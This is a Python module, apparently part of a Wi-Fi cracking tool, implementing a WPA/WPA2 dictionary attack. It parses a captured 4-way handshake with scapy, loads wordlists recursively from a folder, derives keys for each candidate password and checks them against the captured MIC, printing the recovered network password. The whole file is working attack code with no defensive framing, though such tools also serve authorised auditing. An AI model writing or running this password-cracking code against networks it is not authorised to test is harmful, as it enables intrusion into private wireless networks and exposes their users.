from typing import List, TextIO, Union
import os
from scapy.layers.dot11 import Dot11, PacketList
from scapy.layers.eap import EAPOL
from .utils import EAPOLParser, KeyGeneration, _dictionary_folder


class DictionaryAttack:

    def __init__(self, ssid: str, handshake: PacketList, dictionary_folder: str = _dictionary_folder) -> None:
        self._ssid: str = ssid
        self._handshake: PacketList = handshake
        self._dictionary_folder: str = dictionary_folder
        self._wlan_psw: None = None
        if self._handshake is Union[None]:
            print("No valid 4-Way-Handshake")
            return
        self._parse_pcap()
        self._start_dictionary_attack()

    def _parse_pcap(self) -> None:
        i: int = 0
        self._eapol_data: List[bytes] = []
        self._eapol_mic: List[bytes] = []
        for packet in self._handshake:
            eapol: EAPOLParser = EAPOLParser(eapol_packet=packet[EAPOL])
            try:
                self._anonce: bytes = eapol.get_wpa_key_anonce()
            except TypeError:
                pass
            try:
                self._snonce: bytes = eapol.get_wpa_key_snonce()
            except TypeError:
                pass
            self._key_descriptor: str = eapol.get_key_descriptor()
            self._eapol_data.append(eapol.get_eapol_data())
            self._eapol_mic.append(eapol.get_wpa_key_mic())
            if i == 0:
                self._ap_mac: str = packet[Dot11].addr2
                self._sta_mac: str = packet[Dot11].addr1
            i += 1

    def _start_dictionary_attack(self) -> None:
        dictionary: List[str] = []
        DictionaryAttack._get_dictionary(
            dictionary=dictionary,
            path=self._dictionary_folder
        )
        print()
        print("-----------------------")
        print("Start dictionary attack")
        print("-----------------------")
        print()
        for psw in dictionary:
            key_generation: KeyGeneration = KeyGeneration(
                psk=psw,
                ssid=self._ssid,
                ap_mac=self._ap_mac,
                sta_mac=self._sta_mac,
                anonce=self._anonce,
                snonce=self._snonce,
                key_descriptor=self._key_descriptor
            )
            mic_match: bool = False
            for i, data in enumerate(self._eapol_data):
                if i == 0:
                    continue
                mic_calculated: bytes = key_generation.calculate_mic(eapol_data=data)
                mic_captured: bytes = self._eapol_mic[i]
                if mic_calculated.hex() == mic_captured.hex():
                    mic_match = True
                else:
                    mic_match = False
            if mic_match:
                self._wlan_psw: str = psw
                break
        if self._wlan_psw:
            print(f"WLAN PSW FOUND: '{self._wlan_psw}'")
        else:
            print("WLAN PSW NOT FOUND")

    def get_wlan_psw(self) -> str:
        return self._wlan_psw

    @staticmethod
    def _get_dictionary(dictionary: List[str], path: str) -> None:
        for item in os.listdir(path=path):
            if os.path.isfile(path=f"{path}/{item}"):
                DictionaryAttack._add_words(
                    dictionary=dictionary,
                    file_path=f"{path}/{item}"
                )
            if os.path.isdir(s=f"{path}/{item}"):
                DictionaryAttack._get_dictionary(
                    dictionary=dictionary,
                    path=f"{path}/{item}"
                )

    @staticmethod
    def _add_words(dictionary: List[str], file_path: str) -> None:
        print(f"Add wordlist: {file_path}")
        fp: TextIO = open(file=file_path, mode="r")
        try:
            for line in fp.readlines():
                word: str = line.replace("\n", "")
                if word not in dictionary:
                    dictionary.append(word)
        except UnicodeDecodeError:
            print(f"UnicodeDecodeError in file: {file_path}")
        fp.close()
